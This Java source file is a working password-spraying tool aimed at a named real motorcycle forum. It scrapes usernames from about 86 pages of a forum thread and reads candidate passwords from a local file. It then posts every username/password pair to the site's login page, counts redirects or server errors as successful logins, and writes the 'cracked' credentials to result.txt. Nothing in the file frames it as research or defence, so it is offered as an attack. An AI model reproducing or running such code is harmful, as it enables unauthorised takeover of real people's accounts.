package com.youtubers;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.util.List;
import java.util.*;
import java.io.File;


import java.util.HashMap;
import java.util.Map;


public class Requests {

    public Requests () {

        System.out.println("Scanning for users...");
        Map<String, User> userList = this.loadUsers();
        System.out.println("Users scanned: " + userList.size() + " users.");

        System.out.println("Gathering passwords...");
        List<Password> passwordList = this.loadPasswords();

        System.out.println("Trying passwords");
        ArrayList <UserPassword> crackedPasswords =  this.tryPasswords(passwordList ,userList);

        String file = this.printResults(crackedPasswords);
        System.out.println("\nResults printed in file " + file);


    }

    // Returns a HashMap with all userNames.
    public Map <String, User>  loadUsers () {
        try {
            Map <String, User> userList = new HashMap<>();
            String url = "http://www.portalmotos.com/modulos/foros/tema.asp?TemaId=76490&pagina=";
            int numberOfPages = 87;

            for (int i = 1; i < numberOfPages; i++) {
                String page = String.valueOf(i);
                Document document = Jsoup.connect(url + page).get();
                Elements userNames = document.select("tr td a b");

                for (Element userName: userNames) {
                    if (!userList.containsKey(userName.html())) {
                        if (userName.html().startsWith("<")) {
                            String user = userName.select("span").html();
                            userList.put( user , new User(user));
                        }
                        else {
                            userList.put(userName.html() , new User(userName.html()));
                        }
                    }
                }
            }
            userList.put("juan123456" , new User("juan123456"));
            return userList;
        }
        catch (Exception e) {
            System.out.println(e);
            return null;
        }
    }

    public List<Password> loadPasswords () {
        List<Password> passwordList = new ArrayList<Password>();

        try {
            File file = new File("passwords.txt");
            Scanner scanner = new Scanner(file);

            while (scanner.hasNextLine()) {
                String line = scanner.nextLine();
                passwordList.add(new Password(line));
            }
            return passwordList;
        }
        catch (Exception e) {
            System.out.println("Error: " + e);
            return passwordList;
        }
    }

    public ArrayList <UserPassword> sendPost (Map <String, User> userList, String password) {
        try {
            ArrayList <UserPassword> crackedUsers = new ArrayList();
            String url = "http://www.portalmotos.com/modulos/usuarios/login.asp";
            int userCount = 1;

            for (String userName : userList.keySet()) {
                String cookieName = "ASPSESSIONIDASRAARRD";

                // Checks if the password is equal to the user name.
                if (password.equals("*")) {
                    password = userName;
                }

               /* Connection.Response response0 = Jsoup.connect(url)
                        .method(Connection.Method.GET)
                        .execute();

                String sessionId = response0.cookie(cookieName);*/

                try {
                    Connection.Response response = Jsoup.connect(url)
                            .method(Connection.Method.POST)
                            .data("UsuarioNick", userName)
                            .data("Clave", password)
                            .data("Modo", "conectar")
                            .data("ret_page", "")
                            .data("submit", "Conectar")
                            .userAgent("Mozilla/5.0")
                            .followRedirects(true)
                            .execute();

                    if (!String.valueOf(response.url()).equals(url)) {
                        System.out.println("Success - Username: " + userName + ", Password: " + password + " " + response.url() + "\n");
                        crackedUsers.add(new UserPassword(userName, password));
                    }
                    else {
                        System.out.println("Failed - user " + userCount++ + "/" + userList.size() + " " + response.url() + " " + userName + " " + password);
                    }

                }
                catch (Exception e) {
                    // Website sends error 500 when successful login. So we handle it here.
                    //System.out.println(e);
                    System.out.println("Success - Username: " + userName + ", Password: " + password + " " + "\n");
                    crackedUsers.add(new UserPassword(userName, password));
                    continue;
                }

            }
            return crackedUsers;
        }
        catch (Exception e) {
            System.out.println(e);
            return null;
        }
    }

    public ArrayList <UserPassword> tryPasswords (List <Password> passwordList, Map <String, User> userList) {
        ArrayList <UserPassword> crackedUsers = new ArrayList<>();

        for (Password password : passwordList) {
            String passwd = password.getPassword();

            System.out.println("\nTrying password: " + passwd + "\n");
            crackedUsers.addAll(this.sendPost(userList, passwd));
        }
        return crackedUsers;
    }

    public String printResults (ArrayList <UserPassword> users) {
        try {
            String fileName = "result.txt";
            PrintWriter writer = new PrintWriter(fileName, "UTF-8");

            writer.println("CRACKED PASSWORD RESULTS\n");

            for (UserPassword user : users) {
                writer.println("user: " + user.getUserName() + " , password: " + user.getUserPassword());
            }
            writer.close();
            return fileName;
        }
        catch (Exception e) {
            System.out.println("Error printing the file: " + e);
            return null;
        }
    }

}
